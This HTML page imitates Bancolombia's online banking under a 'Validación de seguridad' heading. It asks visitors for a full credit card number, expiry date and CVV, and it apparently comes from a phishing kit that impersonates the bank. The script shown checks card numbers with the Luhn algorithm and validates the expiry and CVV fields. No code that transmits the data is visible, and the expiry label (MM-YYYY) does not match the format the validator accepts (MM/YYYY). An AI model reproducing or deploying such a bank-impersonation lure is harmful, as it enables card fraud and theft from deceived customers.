<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Sucursal Virtual</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bancolombia-yellow': '#fdda24',
                    }
                }
            }
        }
    </script>
    <style>
        @font-face {
            font-family: 'bancolombia';
            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
            font-weight: 300;
            font-style: normal;
        }

        body {
            font-family: 'Open Sans', sans-serif;
        }

        .font-bancolombia {
            font-family: 'bancolombia', sans-serif;
        }

        .font-open-sans {
            font-family: 'Open Sans', sans-serif;
            font-weight: 400;
        }

        .font-open-sans-semibold {
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
        }

        .font-cib-sans-light {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 300;
        }

        .font-cib-sans-bold {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 700;
        }

        .floating-label-container {
            position: relative;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
        }

        .floating-label {
            position: absolute;
            left: 2.5rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            color: #6b7280;
            transition: all 0.2s ease;
            padding: 0 4px;
            pointer-events: none;
            z-index: 10;
            background: white;
        }

        .floating-label.active {
            top: -4px;
            left: 0.5rem;
            font-size: 12px;
            color: #374151;
            transform: translateY(0);
        }

        .floating-input {
            width: 100%;
            padding: 12px 16px 12px 40px;
            font-weight: 600;
            font-size: 14px;
            outline: none;
            transition: all 0.2s ease;
            background: white;
            border: none;
            border-bottom: 0.5px solid #d1d5db;
        }

        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            z-index: 5;
        }

        .floating-input:focus {
            border-bottom: 0.5px solid #374151;
        }

        .thin-border-bottom {
            border-bottom: 0.5px solid #d1d5db;
        }

        .thin-border-input {
            border-bottom: 0.5px solid #d1d5db !important;
        }

        .thin-border-input:focus {
            border-bottom: 0.5px solid #374151 !important;
        }

        .bg-bancolombia {
            background-image: url('/3co/assets/bgImage.svg');
            background-position: bottom;
            background-repeat: no-repeat;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #fdda24;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .password-input {
            font-size: 18px;
            font-weight: 600;
            color: #000;
            text-align: center;
            background: white;
            border: none;
            outline: none;
            padding: 2px 0 8px 0;
            caret-color: #000;
        }

        .password-input:focus {
            border-bottom-color: #374151;
        }

        @media (hover: none) and (pointer: coarse) {
            .password-input {
                font-size: 20px;
                padding: 1px 0 9px 0;
            }
        }
    </style>
</head>

<body class="bg-gray-100">

    <!-- Header -->
    <div class="w-full flex justify-center items-center py-3 z-50">
        <div class="w-[98%] flex gap-10 items-center">
            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
            <div class="flex justify-center items-center gap-1.5 cursor-pointer" onclick="salir()">
                <span class="text-[15px]">Salir</span>
                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-center">

        <!-- TDC -->
        <div id="tdc" class="w-full flex flex-col justify-center items-center pb-6">
            <h5 class="text-[24px] font-cib-sans-bold mt-10">Validación de seguridad</h5>
            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
                <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                    <div class="w-full flex items-center justify-center hiddenerror hidden">
                        <span class="text-[11px] text-red-600"> Los datos ingresados son incorrectos. Intenta
                            nuevamente.</span>
                    </div>
                    <div class="w-[90%] flex flex-col mt-2.5 mb-4">
                        <span class="text-[16px] text-center text-gray-800">
                            Ingresa los siguientes datos de tu tarjeta de crédito:
                        </span>
                    </div>

                    <!-- Número de tarjeta -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z">
                                </path>
                            </svg>
                            <input id="numeroTarjetaCredito" type="tel" inputmode="numeric" class="floating-input"
                                placeholder="" value="" />
                            <span id="numeroTarjetaCreditoLabel" class="floating-label">
                                Número de tarjeta
                            </span>
                        </div>
                        <span id="numeroTarjetaCreditoError"
                            class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <!-- Fecha de expiración -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z">
                                </path>
                            </svg>
                            <input id="fechaVencimientoCredito" type="text" maxlength="7" placeholder=""
                                class="floating-input" value="" />
                            <span id="fechaVencimientoCreditoLabel" class="floating-label">
                                Fecha de expiración (MM-YYYY)
                            </span>
                        </div>
                        <span id="fechaCreditoError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <!-- CVV -->
                    <div class="w-full flex flex-col justify-center items-center my-2.5">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
                                </path>
                            </svg>
                            <input id="cvvCredito" type="tel" inputmode="numeric" maxlength="4" class="floating-input"
                                placeholder="" value="" />
                            <span id="cvvCreditoLabel" class="floating-label">
                                Código de seguridad (CVV)
                            </span>
                        </div>
                        <span id="cvvCreditoError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <button id="continuarTarjetaCredito"
                        class="mt-4 font-bold py-2 px-6 rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                        disabled>
                        Validar
                    </button>
                </div>
            </div>
        </div>

    </div>

    <!-- Footer -->
    <div class="w-full flex flex-col justify-center items-center py-7">
        <div class="w-[90%] border-t border-gray-300"></div>
        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
    </div>

    <script>
        /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */

        /**
         * Valida un número de tarjeta usando el algoritmo de Luhn
         */
        function validarLuhn(numero) {
            let suma = 0, alternar = false;
            for (let i = numero.length - 1; i >= 0; i--) {
                let n = parseInt(numero.charAt(i));
                if (alternar) { n *= 2; if (n > 9) n -= 9; }
                suma += n; alternar = !alternar;
            }
            return suma % 10 === 0;
        }

        /**
         * Valida tarjeta de débito o crédito
         * Valida: número (15-16 dígitos + Luhn), fecha (MM/YYYY), CVV (3-4 dígitos)
         */
        function validateTarjeta(isCredito = false, showErrors = false) {
            const prefix = isCredito ? 'Credito' : '';
            const numeroTarjeta = document.getElementById(`numeroTarjeta${prefix}`);
            const fechaCompleta = document.getElementById(`fechaVencimiento${prefix}`);
            const cvv = document.getElementById(`cvv${prefix}`);

            if (!numeroTarjeta || !fechaCompleta || !cvv) return false;

            const numero = numeroTarjeta.value.replace(/\s/g, '');
            const fecha = fechaCompleta.value;
            const cvvVal = cvv.value;

            const hoy = new Date();
            const anioActual = hoy.getFullYear();
            const mesActual = hoy.getMonth() + 1;
            const errores = {};

            // Validar número de tarjeta
            if (!numero.trim()) {
                errores.numero = "Este campo es obligatorio";
            } else if (!/^\d+$/.test(numero)) {
                errores.numero = "Solo se permiten números";
            } else if (numero.length < 15 || numero.length > 16) {
                errores.numero = "Debe tener entre 15 y 16 dígitos";
            } else if (!validarLuhn(numero)) {
                errores.numero = "Número inválido";
            }

            // Validar fecha de vencimiento
            if (!fecha.trim()) {
                errores.fecha = "Este campo es obligatorio";
            } else if (!/^\d{2}\/\d{4}$/.test(fecha)) {
                errores.fecha = "Formato inválido (MM/YYYY)";
            } else {
                const [mes, anio] = fecha.split('/');
                const mesInt = parseInt(mes);
                const anioInt = parseInt(anio);

                if (mesInt < 1 || mesInt > 12) {
                    errores.fecha = "Mes inválido";
                } else if (anioInt < anioActual || (anioInt === anioActual && mesInt < mesActual)) {
                    errores.fecha = "La tarjeta está vencida";
                } else if (anioInt > 2040) {
                    errores.fecha = "Fecha demasiado lejana";
                }
            }

            // Validar CVV
            if (!cvvVal.trim()) {
                errores.cvv = "Este campo es obligatorio";
            } else if (!/^\d{3,4}$/.test(cvvVal)) {
                errores.cvv = "Debe tener 3 o 4 dígitos";
            }

            if (showErrors) {
                const numeroError = document.getElementById(`numeroTarjeta${prefix}Error`);
                const fechaError = document.getElementById(`fecha${prefix}Error`);
                const cvvError = document.getElementById(`cvv${prefix}Error`);

                setError(numeroError?.id || '', errores.numero);
                setError(fechaError?.id || '', errores.fecha);
                setError(cvvError?.id || '', errores.cvv);
            }

            const isValid = Object.keys(errores).length === 0;
            return isValid;
        }

        /**
         * Muestra o oculta mensajes de error
         */
        function setError(id, msg) {
            const el = document.getElementById(id);
            if (!el) return;
            if (msg) {
                el.textContent = msg;
                el.classList.remove('hidden');
            } else {
                el.classList.add('hidden');
            }
        }
    </script>

</body>

</html>
